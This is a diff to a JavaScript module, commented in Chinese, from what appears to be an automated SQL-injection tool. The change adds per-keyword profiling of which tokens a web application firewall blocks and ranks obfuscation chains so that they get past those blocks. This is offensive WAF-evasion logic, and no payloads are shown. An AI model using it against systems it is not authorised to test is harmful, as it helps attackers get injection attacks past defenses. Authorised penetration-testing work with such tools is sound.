@@ -12,23 +12,11 @@
 import { buildInjectionRequest } from '../../engine/injection.js';
 import { applyTampers } from '../tamper/applyTampers.js';
 import { logger } from '../logger.js';
+// [A2-2026-09-21] 拦截判定与逐词画像/定向选链统一收敛到 blockProfile：
+// 原来 looksBlocked 定义在本文件，新模块若各写一份就会出现"两处口径漂移"（本仓高频病）。
+import { looksBlocked, profileBlockedTokens, rankChainsByProfile } from './blockProfile.js';
 
-const BLOCKED_STATUSES = new Set([403, 406, 429, 501, 503]);
 const MAX_CHAINS = 3; // 最多验证 3 条候选链（预算约束）
-
-function looksBlocked(res, baseLen, { strict = false } = {}) {
-  if (!res) return true;
-  if (BLOCKED_STATUSES.has(res.status)) return true;
-  // [P0-FIX 2026-09-10] 链验证阶段（strict）只认硬拦截信号（状态码 / 拦截页文案）：
-  // 「响应体缩水至基线 50%」是给**裸探针**判「WAF 对该形态敏感」用的启发式，但把它套到
-  // **链验证**上是误判——payload 一旦真正生效，结果集本就变空/变短（如 /blind 恒返回空页），
-  // 于是每条链都被判「仍被拦」→ 全部候选失败 → 重跑被跳过（实测 blind 场景
-  // `3 条候选链探针均被拦截，跳过自动重跑`）。链验证要回答的是「WAF 是否放行」，不是「响应是否变短」。
-  if (strict) return /blocked by|request blocked|access denied|安全狗|拦截/i.test(String(res.data ?? ''));
-  const len = String(res.data ?? '').length;
-  if (baseLen > 0 && len < baseLen * 0.5) return true;
-  return false;
-}
 
 /**
  * 对候选 tamper 链做探针验证。
@@ -85,19 +73,31 @@ export async function verifyTamperChains({ httpClient, target, point, chains, co
     }
     if (!allRawBlocked) return list[0];
 
-    // 3) 逐链验证：任一探针套链后未被拦截 → 该链有效（strict：只认硬拦截）
-    for (const chain of list.slice(0, MAX_CHAINS)) {
+    // 3) [A2-2026-09-21] 逐词画像 + 定向选链。
+    //    走到这里说明「整串探针**全**被拦」。原先直接 `list.slice(0, MAX_CHAINS)` **按序**取前 3 条
+    //    —— 那是盲选：3 个名额可能全花在「消除 `--` 的链」上，而目标实际拦的是 `union`。
+    //    现在先花预算做逐词画像（哪些词被拦），再按「能消除被拦词」重排候选。
+    //    成本纪律：**仅在此分支发生** —— 目标不敏感时（上面 allRawBlocked=false 已返回）零额外请求。
+    const profile = await profileBlockedTokens({ httpClient, target, point, config, baseLen, timeoutMs });
+    const ranked = profile.blocked.length ? rankChainsByProfile(list, profile.blocked) : list.slice();
+
+    // 4) 逐链验证：任一探针套链后未被拦截 → 该链有效（strict：只认硬拦截）
+    for (const chain of ranked.slice(0, MAX_CHAINS)) {
       for (const pv of probeValues) {
         const t = await send(pv, chain.plugins);
         if (!looksBlocked(t.res, baseLen, { strict: true })) {
           logger.info(
-            `WAF 链验证：[${chain.plugins.join(',')}] 探针放行（${t.elapsed}ms），候选共 ${list.length} 条`
+            `WAF 链验证：[${chain.plugins.join(',')}] 探针放行（${t.elapsed}ms），候选共 ${list.length} 条` +
+              (profile.blocked.length ? `（画像被拦：${profile.blocked.join('/')}）` : '')
           );
           return chain;
         }
       }
     }
-    logger.warn(`WAF 链验证：${Math.min(list.length, MAX_CHAINS)} 条候选链探针均被拦截，跳过自动重跑`);
+    logger.warn(
+      `WAF 链验证：${Math.min(ranked.length, MAX_CHAINS)} 条候选链探针均被拦截，跳过自动重跑` +
+        (profile.blocked.length ? `（画像被拦：${profile.blocked.join('/')}）` : '')
+    );
     return null;
   } catch (e) {
     // 验证流程异常 → 保守回退首条链（不因验证器故障削弱旧行为）
